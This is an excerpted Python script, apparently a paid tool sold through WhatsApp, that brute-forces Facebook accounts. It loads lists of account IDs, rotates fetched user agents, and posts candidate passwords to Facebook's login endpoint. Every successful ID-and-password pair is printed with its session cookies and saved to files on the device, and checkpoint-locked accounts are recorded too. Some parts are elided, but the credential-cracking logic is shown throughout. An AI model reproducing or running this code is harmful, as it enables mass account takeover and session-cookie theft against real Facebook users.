...
def main():
    stored_password = "HAMIDUL"  # Replace with your stored password
    ...
    while True:
        ...
        print(" \033[92;1m‌‌‌~™PASSWORD CHEAKING™~ ")
        time.sleep(2)
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109",]
...
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/dxHAMIDUL-99/F88/main/approved.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://raw.githubusercontent.com/dxHAMIDUL720/FGJA/main/GFUD-txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/HAMIDUL.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-HAMIDUL ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • DJ JAMAI ]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mHAMIDUL143 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01788583884 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 2.8 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m """
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/HAMIDUL143/NOYON-API/blob/main/API.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 200 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 300 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m HAMIDUL TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+8801788583884?text={message}'
...
os.system('espeak -a 300 " Welcome,   to,  HAMIDUL,  King,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    HAMIDUL = input('\x1b[1;92m[+] CHOOSE: ')
    if HAMIDUL in ['111']:
        login()
        dump_massal()
    elif HAMIDUL in ['1']:
        crack_file()
    elif HAMIDUL in ['2','02']:
        os.system('xdg-open https://wa.me/+8801788583884')
        os.system("python nono.py")
    elif HAMIDUL in ['3','03']:
        result()
    elif HAMIDUL in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Noyon.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[HAMIDUL•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    #sys.stdout.write(f"\r\033[100;92m{bo}[HAMIDUL•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;97m[\033[0;93mHAMIDUL-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/HAMIDUL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;92mHAMIDUL-Ok] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                #print(f'\r\033[0;92m[HAMIDUL\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " HAMIDUL,  Ok,  id"')
                open('/sdcard/HAMIDUL-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[HAMIDUL-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mHAMIDUL-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/HAMIDUL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mHAMIDUL-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " HAMIDUL,  Ok,  id"')
                open('/sdcard/HAMIDUL-OK.txt', 'a').write( cid+' | '+ps+' \n')
                break
